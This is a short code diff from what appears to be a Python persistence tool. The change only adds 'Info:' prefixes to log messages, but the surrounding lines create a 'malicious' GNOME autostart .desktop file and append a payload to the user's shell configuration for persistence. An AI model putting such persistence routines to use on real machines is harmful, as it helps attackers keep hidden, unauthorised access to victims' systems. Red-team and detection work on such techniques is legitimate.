@@ -29,7 +29,7 @@ def drop_config_autostart(platform, username):
             f.write("Hidden=false\n")
             f.write("NoDisplay=false\n")
             f.write("X-GNOME-Autostart-enabled=true\n")
-        print(f"Malicious .desktop file created at: {desktop_file}")
+        print(f"Info: Malicious .desktop file created at: {desktop_file}")
 
 
 def drop_profile_modification(platform, username):
@@ -54,7 +54,7 @@ def drop_profile_modification(platform, username):
                     with open(shell_config_file, "a") as f:
                         f.write(payload)
                     print("Payload added to the shell configuration file for persistence.")
-            print(f"Shell configuration file modified: {shell_config_file}")
+            print(f"Info: Shell configuration file modified: {shell_config_file}")
         else:
             print("Warning: .bashrc file not found in the home")
 
